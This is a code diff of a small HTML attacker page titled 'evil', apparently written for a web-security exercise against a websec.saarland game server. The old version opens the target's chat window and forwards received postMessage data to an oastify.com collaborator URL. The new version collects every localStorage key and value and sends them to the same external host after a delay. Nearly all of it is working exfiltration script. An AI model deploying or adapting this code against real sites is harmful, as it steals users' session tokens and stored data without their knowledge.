@@ -3,15 +3,17 @@
   <head>
     <title>evil</title>
     <script>
-      // باز کردن پنجره چت
-      let chatWindow = window.open("https://gameserver.websec.saarland/chat", "_blank");
-
-      // دریافت پیام‌ها از صفحه چت
-      window.addEventListener("message", (event) => {
-        if (event.origin.includes("websec.saarland")) {
-          fetch("https://0ghj7ax4p9pg0zr3v94kctd6sxyomea3.oastify.com/log?" + encodeURIComponent(event.data));
+      setTimeout(() => {
+        let result = "";
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          const value = localStorage.getItem(key);
+          result += key + "=" + value + "&";
         }
-      }, false);
+
+        // send all localStorage keys/values to oastify
+        fetch("https://0ghj7ax4p9pg0zr3v94kctd6sxyomea3.oastify.com/log?" + encodeURIComponent(result));
+      }, 3000);
     </script>
   </head>
   <body>
